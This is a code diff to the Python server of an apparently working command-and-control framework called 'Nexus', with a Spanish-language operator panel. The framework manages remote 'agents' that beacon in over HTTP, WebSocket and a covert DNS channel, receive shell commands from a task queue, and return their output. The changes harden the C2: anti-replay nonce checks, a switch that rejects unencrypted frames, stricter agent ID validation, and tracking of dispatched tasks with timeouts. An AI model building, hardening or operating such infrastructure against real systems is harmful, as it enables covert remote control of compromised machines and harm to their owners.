@@ -3,6 +3,7 @@ import base64
 import json
 import logging
 import os
+import re
 import socket as _socket
 import struct
 import time
@@ -79,8 +80,8 @@ tr.selected td{background:#071a07;border-left:2px solid #00ff41}
     <div class="panel-title">Agentes</div>
     <div style="flex:1;overflow-y:auto">
       <table>
-        <thead><tr><th>Estado</th><th>Agent ID</th><th>Jitter beacon</th><th>Pending</th></tr></thead>
-        <tbody id="agent-rows"><tr><td colspan="4" class="empty">Sin agentes</td></tr></tbody>
+        <thead><tr><th>Estado</th><th>Agent ID</th><th>Jitter beacon</th><th>Cola</th><th>Inflight</th></tr></thead>
+        <tbody id="agent-rows"><tr><td colspan="5" class="empty">Sin agentes</td></tr></tbody>
       </table>
     </div>
     <div class="task-form" id="task-form">
@@ -129,7 +130,8 @@ async function refresh(){
         <td>${a.agent_id}</td>
         <td>${jBar(a.last_seen,a.status)}</td>
         <td>${a.pending_tasks}</td>
-      </tr>`).join(''):'<tr><td colspan="4" class="empty">Sin agentes registrados</td></tr>';
+        <td>${a.inflight_tasks>0?`<span style="color:#ffaa00;font-weight:bold">${a.inflight_tasks} ↗</span>`:'0'}</td>
+      </tr>`).join(''):'<tr><td colspan="5" class="empty">Sin agentes registrados</td></tr>';
     document.getElementById('st-left').textContent=online+' agente'+(online!==1?'s':'')+' online';
     document.getElementById('st-right').textContent=new Date().toLocaleTimeString();
   }catch(e){document.getElementById('st-left').textContent='Sin conexión con el servidor'}
@@ -207,6 +209,7 @@ TASK_QUEUE_MAX   = 100
 MAX_RESULTS      = 500
 MAX_OUTPUT_BYTES = 64 * 1024
 OPERATOR_API_KEY = os.environ.get("NEXUS_API_KEY", "")
+ALLOW_CLEAR      = os.environ.get("NEXUS_ALLOW_CLEAR", "0") == "1"
 DNS_PORT         = int(os.environ.get("NEXUS_DNS_PORT", "5354"))
 DNS_DOMAIN       = b"n\x02c2\x00"  # encoded "n.c2" label sequence
 
@@ -217,7 +220,8 @@ server_priv   = None          # X25519PrivateKey — loaded at startup
 sessions: dict = {}           # session_id_hex -> SessionState
 agents:   dict = {}           # agent_id -> AgentState
 results:  dict = {}           # agent_id -> [ResultEntry]
-tasks:    dict = {}           # agent_id -> asyncio.Queue
+tasks:    dict = {}           # agent_id -> asyncio.Queue (PENDING)
+inflight: dict = {}           # agent_id -> {task_id -> {task, dispatched_at, timeout_s}}
 
 
 # ---------------------------------------------------------------------------
@@ -243,32 +247,67 @@ async def _operator_auth(request: web.Request, handler):
 
 class SessionState:
     def __init__(self, session_id: bytes, chacha, srv_nonce):
-        self.session_id = session_id
-        self.chacha     = chacha
-        self.srv_nonce  = srv_nonce
-        self.agent_id   = None
-        self.last_seen  = time.time()
-        self.encrypted  = chacha is not None
+        self.session_id       = session_id
+        self.chacha           = chacha
+        self.srv_nonce        = srv_nonce
+        self.agent_id         = None
+        self.last_seen        = time.time()
+        self.encrypted        = chacha is not None
+        self.last_agent_nonce = -1   # anti-replay: highest agent nonce seen
 
+    def check_nonce(self, frame: bytes) -> None:
+        """Raise ValueError if the frame nonce is a replay (≤ last seen)."""
+        nonce_int = int.from_bytes(frame[1:13], "little")
+        if nonce_int <= self.last_agent_nonce:
+            raise ValueError(
+                f"replay: nonce {nonce_int} ≤ last seen {self.last_agent_nonce}"
+            )
+        self.last_agent_nonce = nonce_int
+
+
+_AGENT_ID_RE = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')
 
 def _validate_agent_id(agent_id: str) -> bool:
-    return bool(agent_id) and agent_id != "unknown" and len(agent_id) <= 128
+    return bool(agent_id) and bool(_AGENT_ID_RE.match(agent_id))
 
 
 def _ensure_agent(agent_id: str) -> None:
     if agent_id not in agents:
         agents[agent_id] = {
-            "agent_id":     agent_id,
-            "last_seen":    time.time(),
-            "status":       "online",
+            "agent_id":      agent_id,
+            "last_seen":     time.time(),
+            "status":        "online",
             "pending_tasks": 0,
+            "inflight_tasks": 0,
         }
-        results[agent_id] = []
-        tasks[agent_id]   = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
+        results[agent_id]  = []
+        tasks[agent_id]    = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
+        inflight[agent_id] = {}
         log.info("NEW   agent_id=%.8s", agent_id)
     else:
         agents[agent_id]["last_seen"] = time.time()
         agents[agent_id]["status"]    = "online"
+
+
+def _dispatch_task(agent_id: str, task: dict, frame_builder) -> bytes:
+    """Move task from PENDING → DISPATCHED (inflight). Returns the task frame."""
+    agents[agent_id]["pending_tasks"] = max(0, agents[agent_id]["pending_tasks"] - 1)
+    inflight.setdefault(agent_id, {})[task["task_id"]] = {
+        "task":         task,
+        "dispatched_at": time.time(),
+        "timeout_s":    task.get("timeout_s", 30),
+    }
+    agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])
+    log.info("TASK   agent_id=%.8s task_id=%.8s cmd=%r [DISPATCHED]",
+             agent_id, task["task_id"], task["cmd"])
+    return frame_builder(task)
+
+
+def _complete_task(agent_id: str, task_id: str) -> None:
+    """Move task from DISPATCHED → COMPLETE (remove from inflight)."""
+    if agent_id in inflight and task_id in inflight[agent_id]:
+        del inflight[agent_id][task_id]
+        agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])
 
 
 # ---------------------------------------------------------------------------
@@ -297,14 +336,29 @@ async def handle_nexus(request: web.Request) -> web.Response:
                     body=pack_clear(MSG_ERROR), status=401,
                     content_type="application/octet-stream",
                 )
+            try:
+                sess.check_nonce(body)
+            except ValueError as exc:
+                log.warning("REPLAY blocked session=%.8s: %s", session_id_hex, exc)
+                return web.Response(
+                    body=pack_clear(MSG_ERROR), status=400,
+                    content_type="application/octet-stream",
+                )
             return await _dispatch_encrypted(msg_type, payload, sess, session_id_hex)
 
-    # ── Clear frames (Fase 1-2) or HELLO ─────────────────────────────────────
+    # ── Clear frames: HELLO always allowed; BEACON/RESULT only if NEXUS_ALLOW_CLEAR=1 ──
     msg_type, payload = unpack_clear(body)
     name = MSG_NAMES.get(msg_type, f"0x{msg_type:02x}")
 
     if msg_type == MSG_HELLO:
         return await _handle_hello(body)
+
+    if not ALLOW_CLEAR:
+        log.warning("clear frame type=%s rejected (set NEXUS_ALLOW_CLEAR=1 to enable)", name)
+        return web.Response(
+            body=pack_clear(MSG_ERROR), status=400,
+            content_type="application/octet-stream",
+        )
 
     if msg_type == MSG_BEACON:
         return await _handle_beacon_clear(payload)
@@ -356,13 +410,9 @@ async def _handle_beacon_clear(payload: bytes) -> web.Response:
     q = tasks.get(agent_id)
     if q and not q.empty():
         try:
-            task = q.get_nowait()
-            agents[agent_id]["pending_tasks"] = max(
-                0, agents[agent_id]["pending_tasks"] - 1
-            )
-            frame = pack_clear(MSG_TASK, json.dumps(task).encode("utf-8"))
-            log.info("TASK   agent_id=%.8s task_id=%.8s cmd=%r",
-                     agent_id, task["task_id"], task["cmd"])
+            task  = q.get_nowait()
+            frame = _dispatch_task(agent_id, task,
+                        lambda t: pack_clear(MSG_TASK, json.dumps(t).encode()))
             return web.Response(body=frame, content_type="application/octet-stream")
         except asyncio.QueueEmpty:
             pass
@@ -387,8 +437,10 @@ async def _handle_result_clear(payload: bytes) -> web.Response:
     data["stderr"] = _truncate(data.get("stderr", ""))
 
     _ensure_agent(agent_id)
-    log.info("RESULT agent_id=%.8s task_id=%.8s exit=%s",
-             agent_id, data.get("task_id", "?"), data.get("exit_code", "?"))
+    task_id = data.get("task_id", "?")
+    _complete_task(agent_id, task_id)
+    log.info("RESULT agent_id=%.8s task_id=%.8s exit=%s [COMPLETE]",
+             agent_id, task_id, data.get("exit_code", "?"))
 
     if agent_id in results:
         bucket = results[agent_id]
@@ -426,14 +478,11 @@ async def _dispatch_encrypted(
         q = tasks.get(agent_id or "")
         if q and not q.empty():
             try:
-                task  = q.get_nowait()
-                agents[agent_id]["pending_tasks"] = max(
-                    0, agents[agent_id]["pending_tasks"] - 1
-                )
-                raw = build_frame(
-                    MSG_TASK, json.dumps(task).encode("utf-8"),
+                task = q.get_nowait()
+                raw  = _dispatch_task(agent_id, task, lambda t: build_frame(
+                    MSG_TASK, json.dumps(t).encode("utf-8"),
                     sess.chacha, sess.srv_nonce,
-                )
+                ))
                 return web.Response(body=raw, content_type="application/octet-stream")
             except asyncio.QueueEmpty:
                 pass
@@ -457,8 +506,10 @@ async def _dispatch_encrypted(
         data["stderr"] = _truncate(data.get("stderr", ""))
 
         _ensure_agent(agent_id)
-        log.info("RESULT(enc) agent_id=%.8s task_id=%.8s exit=%s",
-                 agent_id, data.get("task_id", "?"), data.get("exit_code", "?"))
+        task_id = data.get("task_id", "?")
+        _complete_task(agent_id, task_id)
+        log.info("RESULT(enc) agent_id=%.8s task_id=%.8s exit=%s [COMPLETE]",
+                 agent_id, task_id, data.get("exit_code", "?"))
         bucket = results.setdefault(agent_id, [])
         bucket.append(data)
         if len(bucket) > MAX_RESULTS:
@@ -480,10 +531,11 @@ async def _dispatch_encrypted(
 async def api_list_agents(request: web.Request) -> web.Response:
     out = [
         {
-            "agent_id":     a["agent_id"],
-            "last_seen":    a["last_seen"],
-            "status":       a["status"],
+            "agent_id":      a["agent_id"],
+            "last_seen":     a["last_seen"],
+            "status":        a["status"],
             "pending_tasks": a["pending_tasks"],
+            "inflight_tasks": a.get("inflight_tasks", 0),
         }
         for a in agents.values()
     ]
@@ -579,6 +631,12 @@ async def handle_ws(request: web.Request) -> web.WebSocketResponse:
         try:
             msg_type, payload = parse_frame(frame, sess.chacha)
         except Exception:
+            await ws.send_bytes(pack_clear(MSG_ERROR))
+            continue
+        try:
+            sess.check_nonce(frame)
+        except ValueError as exc:
+            log.warning("WS REPLAY blocked session=%.8s: %s", sid_hex, exc)
             await ws.send_bytes(pack_clear(MSG_ERROR))
             continue
 
@@ -679,8 +737,12 @@ class _DnsProtocol(asyncio.DatagramProtocol):
             sess = sessions[sid_raw]
             try:
                 msg_type, payload = parse_frame(frame, sess.chacha)
+                sess.check_nonce(frame)
                 resp = await _dispatch_encrypted(msg_type, payload, sess, sid_raw)
                 resp_bytes = resp.body
+            except ValueError as exc:
+                log.warning("DNS REPLAY blocked session=%.8s: %s", sid_raw[:8], exc)
+                resp_bytes = pack_clear(MSG_ERROR)
             except Exception as exc:
                 log.error("DNS dispatch error: %s", exc)
                 resp_bytes = pack_clear(MSG_ERROR)
@@ -710,6 +772,32 @@ async def _monitor_agents() -> None:
                 data["status"] = "offline"
                 log.warning("OFFLINE agent_id=%.8s", data["agent_id"])
         await asyncio.sleep(5)
+
+
+async def _monitor_tasks() -> None:
+    """Detect inflight tasks that exceeded timeout and mark them TIMEOUT."""
+    while True:
+        await asyncio.sleep(15)
+        now = time.time()
+        for agent_id, inflight_tasks in list(inflight.items()):
+            for task_id, info in list(inflight_tasks.items()):
+                deadline = info["dispatched_at"] + info["timeout_s"] + 10  # 10s grace
+                if now > deadline:
+                    del inflight_tasks[task_id]
+                    if agent_id in agents:
+                        agents[agent_id]["inflight_tasks"] = len(inflight_tasks)
+                    log.warning("TIMEOUT task_id=%.8s agent_id=%.8s", task_id, agent_id)
+                    bucket = results.setdefault(agent_id, [])
+                    bucket.append({
+                        "agent_id":  agent_id,
+                        "task_id":   task_id,
+                        "exit_code": -1,
+                        "stdout":    "",
+                        "stderr":    f"TIMEOUT — sin respuesta en {info['timeout_s']}s",
+                        "ts":        int(now),
+                    })
+                    if len(bucket) > MAX_RESULTS:
+                        del bucket[0]
 
 
 async def _cleanup_sessions() -> None:
@@ -745,6 +833,7 @@ async def _on_startup(app: web.Application) -> None:
         log.warning("NEXUS_API_KEY not set — operator API is unauthenticated")
     log.info("server pub=%s", pub.hex())
     asyncio.create_task(_monitor_agents())
+    asyncio.create_task(_monitor_tasks())
     asyncio.create_task(_cleanup_sessions())
     asyncio.create_task(_dns_server())
 
